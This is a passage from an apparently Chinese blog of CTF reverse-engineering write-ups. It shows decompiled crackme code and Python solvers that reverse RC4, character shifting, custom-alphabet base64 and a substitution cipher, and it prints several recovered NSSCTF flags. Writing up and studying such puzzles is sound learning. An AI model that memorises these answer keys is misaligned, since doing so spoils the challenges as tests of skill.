class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现是一个rc4然后进行base64加密再进行url编码，直接逆过来即可</p><h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc <span class="token operator">=</span> <span class="token string">'%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA'</span><span class="token builtin">str</span><span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">''</span>key <span class="token operator">=</span> <span class="token string">"HereIsFlagggg"</span>s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> s <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    t <span class="token operator">=</span> <span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    k <span class="token operator">=</span> s_box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛re2"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛re2"></a> [SWPUCTF 2021 新生赛]re2</h2><h3 id="题目描述-4"><a class="markdownIt-Anchor" href="#题目描述-4"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  char Str2<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>90h<span class="token punctuation">]</span> BYREF  char Str<span class="token punctuation">[</span><span class="token number">68</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>60h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>50h<span class="token punctuation">]</span> BYREF  <span class="token builtin">int</span> v7<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>A8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>ACh<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>4h<span class="token punctuation">]</span>  _main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  strcpy<span class="token punctuation">(</span>Str2<span class="token punctuation">,</span> <span class="token string">"ylqq]aycqyp&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  printf<span class="token punctuation">(</span><span class="token operator">&amp;</span>Format<span class="token punctuation">)</span><span class="token punctuation">;</span>  gets<span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> strlen<span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v7<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">96</span> <span class="token operator">|</span><span class="token operator">|</span> Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">98</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">(</span>Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">|</span><span class="token operator">|</span> Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">66</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">24</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> strcmp<span class="token punctuation">(</span>Str<span class="token punctuation">,</span> Str2<span class="token punctuation">)</span> <span class="token punctuation">)</span>    printf<span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_404024<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    printf<span class="token punctuation">(</span>aBingo<span class="token punctuation">)</span><span class="token punctuation">;</span>  system<span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">这题存在多解<span class="token punctuation">:</span>str2 <span class="token operator">=</span> <span class="token string">'ylqq]aycqyp&#123;'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token comment"># 遍历字符串中的每个字符</span><span class="token keyword">for</span> char <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token comment"># 获取字符的 ASCII 值并加上 2</span>    temp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span>        <span class="token comment"># 检查是否超过大写字母范围或小写字母范围</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">&lt;=</span> <span class="token number">96</span> <span class="token keyword">or</span> temp <span class="token operator">></span> <span class="token number">98</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>temp <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token keyword">or</span> temp <span class="token operator">></span> <span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 如果超出范围，将修改后的字符添加到结果字符串</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># 如果在范围内，将修改后的字符减去 24 并添加到结果字符串</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token comment"># 打印修改后的字符串</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可暴力枚举</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">cipher<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">"ylqq]aycqyp&#123;"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token operator">&lt;=</span><span class="token number">96</span> <span class="token keyword">or</span> j <span class="token operator">></span> <span class="token number">98</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>j<span class="token operator">&lt;=</span><span class="token number">64</span> <span class="token keyword">or</span> j <span class="token operator">></span> <span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hubuctf-2022-新生赛simple_re"><a class="markdownIt-Anchor" href="#hubuctf-2022-新生赛simple_re"></a> [HUBUCTF 2022 新生赛]simple_RE</h2><h3 id="题目描述-5"><a class="markdownIt-Anchor" href="#题目描述-5"></a> 题目描述</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//base64编码的反汇编代码，关键是遇到后要根据特征会识别:</span>__int64 __fastcall <span class="token function">sub_401570</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// r15d</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// r12d</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// r13d</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// r14</span>  _BYTE <span class="token operator">*</span>v10<span class="token punctuation">;</span> <span class="token comment">// rax</span>  _BYTE <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token comment">// r9</span>  __int64 v12<span class="token punctuation">;</span> <span class="token comment">// r8</span>  <span class="token keyword">char</span> v13<span class="token punctuation">;</span> <span class="token comment">// cl</span>  <span class="token keyword">char</span> v14<span class="token punctuation">;</span> <span class="token comment">// r11</span>  <span class="token keyword">char</span> v15<span class="token punctuation">;</span> <span class="token comment">// r10</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> v6 <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">%</span> <span class="token number">3</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v8 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> v8<span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">1</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>    v10<span class="token punctuation">[</span>v8<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_5<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    v8 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> v8<span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">1</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>    v10<span class="token punctuation">[</span>v8<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_8<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v11 <span class="token operator">=</span> v10<span class="token punctuation">;</span>  v12 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    v11 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>    v13 <span class="token operator">=</span> a1<span class="token punctuation">[</span>v12<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> aQvejafhmuyjbac<span class="token punctuation">[</span>v13 <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v14 <span class="token operator">=</span> a1<span class="token punctuation">[</span>v12 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> aQvejafhmuyjbac<span class="token punctuation">[</span><span class="token punctuation">(</span>v14 <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v13<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v15 <span class="token operator">=</span> a1<span class="token punctuation">[</span>v12 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v12 <span class="token operator">+=</span> <span class="token number">3</span>i64<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> aQvejafhmuyjbac<span class="token punctuation">[</span><span class="token punctuation">(</span>v15 <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> v14<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3C</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> aQvejafhmuyjbac<span class="token punctuation">[</span>v15 <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v12 <span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_5<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10<span class="token punctuation">[</span>v9 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>    v10<span class="token punctuation">[</span>v9 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10<span class="token punctuation">[</span>v9 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>LABEL_8<span class="token operator">:</span>  <span class="token operator">*</span>a2 <span class="token operator">=</span> v10<span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token operator">*</span>a3 <span class="token operator">=</span> v8<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-4"><a class="markdownIt-Anchor" href="#exp-4"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> stringcipher<span class="token operator">=</span><span class="token string">'5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8=='</span>string1<span class="token operator">=</span><span class="token string">'qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD'</span>string2<span class="token operator">=</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span>string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'NSSCTF&#123;a8d4347722800e72e34e1aba3fe914ae&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><code>str.maketrans(string1, string2)</code>: 这个方法创建一个字符映射表，用于将 <code>string1</code> 中的字符替换为相应位置的 <code>string2</code> 中的字符。在这个上下文中，它用于创建一个替代规则，将密文中的字符进行解密。请确保 <code>string1</code> 和 <code>string2</code> 的长度相同，否则会引发 <code>ValueError</code>。</li><li><code>cipher.translate(str.maketrans(string1, string2))</code>: 这一行将密文 <code>cipher</code> 中的字符根据先前创建的映射表进行替换，相当于执行解密操作。</li><li><code>base64.b64decode(...)</code>: 这一行使用 base64 解码函数来解码由上一步得到的解密后的字符串。<code>b64decode</code> 函数接受一个 base64 编码的字符串，并返回其解码后的原始二进制数据。</li></ol><p>以上为关键函数解释。</p><h2 id="swpuctf-2021-新生赛非常简单的逻辑题"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛非常简单的逻辑题"></a> [SWPUCTF 2021 新生赛]非常简单的逻辑题</h2><h3 id="题目描述-6"><a class="markdownIt-Anchor" href="#题目描述-6"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">'xxxxxxxxxxxxxxxxxxxxx'</span>s <span class="token operator">=</span> <span class="token string">'wesyvbniazxchjko1973652048@$+-&amp;*&lt;>'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">17</span>    s2 <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">17</span>    result <span class="token operator">+=</span> s<span class="token punctuation">[</span><span class="token punctuation">(</span>s1<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">(</span>s2<span class="token operator">+</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">34</span><span class="token punctuation">]</span>  <span class="token comment">#注意！这是生成两个字符并连接</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># result = 'v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-5"><a class="markdownIt-Anchor" href="#exp-5"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#不会逆，直接爆破吧</span>flag <span class="token operator">=</span> <span class="token string">''</span>s <span class="token operator">=</span> <span class="token string">'wesyvbniazxchjko1973652048@$+-&amp;*&lt;>'</span>result <span class="token operator">=</span> <span class="token string">'v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i'</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s1<span class="token operator">=</span>j<span class="token operator">//</span><span class="token number">17</span>        s2<span class="token operator">=</span>j<span class="token operator">%</span><span class="token number">17</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span><span class="token punctuation">(</span>s1<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">and</span> <span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">(</span>s2<span class="token operator">+</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            k<span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># NSSCTF&#123;Fake_RERE_QAQ&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gfctf-2021wordy"><a class="markdownIt-Anchor" href="#gfctf-2021wordy"></a> [GFCTF 2021]wordy</h2><h3 id="题目描述花指令idapython"><a class="markdownIt-Anchor" href="#题目描述花指令idapython"></a> 题目描述(花指令，idapython)</h3><p>下载附件，查壳，发现没壳，接着拖入到Ida中</p><p>打开附件，找主函数发现无法编译，考虑是花指令</p><p>可以看到标红的这段有一段代码</p><blockquote><p>loc_1144:<br /><a href="https://so.csdn.net/so/search?q=jmp&amp;spm=1001.2101.3001.7020">jmp</a>   short near ptr loc_1144+1</p></blockquote><p>这串代码并没有实际的作用，看了很多大佬 的wp才知道这 是一种常见的花指令。把这段代码nop掉就可以，即找到机械码为EBFF的，把它改成90(即为no的机械码），但是我们发现下面的数据中含有大量的EBFF机械码，手动nop坑定是很麻烦的，这时就可以使用idapython(file-Script command打开），用上脚本直接把所有的jmp花指令nop掉<br 